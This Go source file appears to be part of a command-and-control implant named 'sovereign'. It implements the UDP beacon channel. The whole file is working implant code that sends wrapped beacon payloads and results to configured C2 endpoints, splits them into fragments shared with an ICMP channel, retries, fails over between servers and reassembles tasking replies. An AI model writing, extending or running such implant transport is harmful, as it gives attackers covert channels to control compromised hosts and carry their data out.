//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"fmt"
	"net"
	"strconv"
	"time"

	"github.com/r0si/sovereign/pkg/protocol"
)

// sendUDPBeacon sends the (already envelope-wrapped) beacon payload as UDP
// datagrams to the C2 endpoint and reads one response. Bodies larger than a
// conservative datagram payload are split into FC2I fragments (the same
// framing ICMP uses) and the reply is reassembled the same way, so a big result
// or task no longer needs a connection-oriented transport.
//
// Every configured udp:// endpoint is tried in failover order. Fragments of
// one beacon all go to the endpoint that answered first only after a complete
// response; a partial/failed exchange leaves the beacon queued for retry.
func sendUDPBeacon(body []byte) []byte {
	return forEachC2Endpoint("udp", func(_ int, _ string, hostPort, _ string) []byte {
		return sendUDPBeaconAt(hostPort, body)
	})
}

// UDP is connectionless: a single lost fragment used to lose the whole beacon.
// Resend the same fragment set (same random msg id, so server-side assembly is
// idempotent) a bounded number of times before giving up; the beacon layer
// requeues its results after the final failure.
const udpBeaconAttempts = 3

// A variable so tests can exercise the retry path without waiting seconds.
var udpAttemptTimeout = 4 * time.Second

func sendUDPBeaconAt(hostPort string, body []byte) []byte {
	addr, err := net.ResolveUDPAddr("udp", hostPort)
	if err != nil {
		if Debug {
			fmt.Printf("[!] UDP beacon: resolve %s failed: %v\n", hostPort, err)
		}
		return nil
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		if Debug {
			fmt.Printf("[!] UDP beacon: dial %s failed: %v\n", addr, err)
		}
		return nil
	}
	defer conn.Close()

	if err := conn.SetDeadline(time.Now().Add(time.Duration(udpBeaconAttempts)*udpAttemptTimeout + 3*time.Second)); err != nil {
		return nil
	}
	frags := protocol.DatagramFragSplitWithSize(body, udpFragmentPayload(snapshotLink()))
	if len(frags) == 0 {
		if Debug {
			fmt.Println("[!] UDP beacon: body too large for the fragment framing")
		}
		return nil
	}

	// One connection and a single assembler per exchange: late duplicates from
	// an earlier attempt merge with the retransmitted parts.
	asm := protocol.NewDatagramAssembler()
	rbuf := make([]byte, 16*1024*1024)
	for attempt := 0; attempt < udpBeaconAttempts; attempt++ {
		for _, frag := range frags {
			if _, err := conn.Write(frag); err != nil {
				if Debug {
					fmt.Printf("[!] UDP beacon: write failed: %v\n", err)
				}
				return nil
			}
		}
		if full := readUDPResponse(conn, asm, rbuf, udpAttemptTimeout); full != nil {
			return full
		}
		if Debug {
			fmt.Printf("[!] UDP beacon: no response after fragment attempt %d/%d\n", attempt+1, udpBeaconAttempts)
		}
	}
	return nil
}

// readUDPResponse reads until one complete reply is assembled or the attempt
// times out. A legacy un-fragmented reply is returned verbatim (malleable wrap
// included — the beacon parser strips it, as on the TCP transport).
func readUDPResponse(conn *net.UDPConn, asm *protocol.ICMPAssembler, rbuf []byte, timeout time.Duration) []byte {
	deadline := time.Now().Add(timeout)
	for {
		if err := conn.SetReadDeadline(deadline); err != nil {
			return nil
		}
		n, _, err := conn.ReadFromUDP(rbuf)
		if err != nil {
			return nil
		}
		if n == 0 {
			continue
		}
		data := rbuf[:n]
		if protocol.DatagramMaybePlain(data) {
			return data
		}
		msgID, total, index, payload, ok := protocol.DatagramFragParse(data)
		if !ok {
			continue
		}
		full, asmErr := asm.Add(strconv.FormatUint(uint64(msgID), 10), total, index, payload)
		if asmErr != nil || full == nil {
			continue
		}
		return full
	}
}
